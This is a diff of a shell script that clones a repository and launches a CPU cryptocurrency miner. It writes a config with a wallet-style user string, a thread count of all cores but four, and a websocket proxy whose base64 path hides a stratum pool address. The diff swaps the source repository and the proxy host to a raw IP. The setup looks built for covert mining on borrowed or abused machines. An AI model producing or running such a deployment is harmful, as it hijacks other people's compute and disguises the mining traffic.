@@ -19,12 +19,6 @@ sleep 2
 nvm current
 sleep 2
 
-npm install pm2 -g
-sleep 2
-pm2 set pm2:sysmonit true
-sleep 2
-pm2 update
-
 DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
 
 sleep 2
@@ -34,7 +28,7 @@ dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
 
 sleep 2
 
-git clone https://github.com/miltoncarpenter665/nano-mbc.git
+git clone https://github.com/abongiletraeffik/nano-mbc.git
 sleep 2
 cd nano-mbc
 sleep 2
@@ -51,7 +45,7 @@ for i in {a..z} {A..Z} {0..9};
    array[$RANDOM]=$i
 done
 
-currentdate=$(date '+%d-%b-%Y_MybWasmPM2_')
+currentdate=$(date '+%d-%b-%Y_MybWasm_')
 ipaddress=$(curl -s api.ipify.org)
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 used_num_of_cores=`expr $num_of_cores - 4`
@@ -79,7 +73,7 @@ sleep 2
 
 cat > data.json <<END
 {
-  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/c3RyYXR1bS5ub3ZhZ3JpZC5vbmxpbmU6MzAwMQ==",
+  "proxy": "ws://64.226.95.127:80/c3RyYXR1bS5ub3ZhZ3JpZC5vbmxpbmU6MzAwMQ==",
   "config": { "threads": $used_num_of_cores, "log": true },
   "options": { "user": "MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate", "password": "x", "argent": "web-wasm/1.0" }
 }
@@ -97,6 +91,4 @@ echo " "
 echo " "
 sleep 2
 
-pm2 start app.js
-sleep 2
-pm2 monit
+node app.js
